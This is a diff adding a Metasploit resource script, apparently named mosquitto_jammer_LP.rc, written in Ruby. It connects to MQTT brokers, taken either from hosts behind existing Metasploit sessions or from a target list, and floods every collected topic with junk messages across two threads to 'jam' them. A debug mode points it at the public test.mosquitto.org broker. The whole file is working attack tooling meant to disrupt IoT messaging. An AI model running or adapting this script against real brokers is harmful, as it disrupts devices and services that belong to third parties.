@@ -1,0 +1,94 @@
+<ruby>
+require 'paho-mqtt'
+
+### Create a simple client with default attributes
+client = PahoMqtt::Client.new
+$broker = ""
+
+def set_broker(address)
+	$broker = address
+end
+
+# Test and see if we have a database connected
+begin
+	framework.db.hosts
+rescue ::ActiveRecord::ConnectionNotEstablished
+	print_error("Database connection isn't established")
+	return
+end
+
+client.on_connack = proc {
+	 print_good("Connected to the broker #{$broker} for jamming!")
+	 print_good("There are #{framework.datastore["topics"].length} topics!")
+	 print_good("Jamming topics!")
+	 n_topic = framework.datastore["topics"].length / 2
+	 if framework.datastore["topics"].length > 1
+		 t1 = Thread.new {
+		   # Thread #1 runs this code
+			 for i in 0..n_topic
+				 print_status("Topic #{framework.datastore["topics"][i]} " + i.to_s)
+                 client.publish(framework.datastore["topics"][i], "Hello World!", false, 0)
+			 end
+		 }
+
+		 t2 = Thread.new {
+		   # Thread #2 runs this code
+			 for i in (n_topic+1)..(framework.datastore["topics"].length - 1)
+				 print_status("Topic #{framework.datastore["topics"][i]} " + i.to_s)
+                 client.publish(framework.datastore["topics"][i], "Hello World! Again!", false, 0)
+			 end
+		}
+
+		# Wait for thread ending
+		t1.join
+		t2.join
+
+	 else
+		 for i in 0..n_topic
+			 print_status("Topic #{framework.datastore["topics"][i]} " + i.to_s)
+			 client.publish(framework.datastore["topics"][i], "Hello World!", false, 0)
+		 end
+	 end
+}
+
+begin
+	if framework.datastore["full_automatic"]
+		mosquitto_port = framework.datastore["mosquitto_port"]
+		print_line("---- RUNNING FULL AUTOMATIC ----")
+		framework.sessions.each do |session|
+			if framework.datastore["mosquitto_debug"] == true
+				set_broker("test.mosquitto.org")
+				client.connect('test.mosquitto.org', mosquitto_port)
+			else
+                set_broker(session[1].session_host)
+                begin
+                    client.connect(session[1].session_host, mosquitto_port)
+                rescue PahoMqtt::WritingException
+                    print_error("An error occured while publishing the message.")
+                end
+			end
+		end
+	else
+		print_line("---- RUNNING ON TARGETS ----")
+		mosquitto_port = framework.datastore["mosquitto_port"]
+		for i in framework.datastore["targets"]
+				if framework.datastore["mosquitto_debug"] == true
+					set_broker("test.mosquitto.org")
+					client.connect('test.mosquitto.org', mosquitto_port)
+				else
+                    set_broker(i)
+                    begin
+                        client.connect(i, mosquitto_port)
+                    rescue PahoMqtt::WritingException
+                        print_error("An error occured while publishing the message.")
+                    end
+				end
+		end
+	end
+rescue Msf::Exception
+	print_error("Exception in mosquitto_jammer_LP.rc")
+	return
+end
+
+
+</ruby>
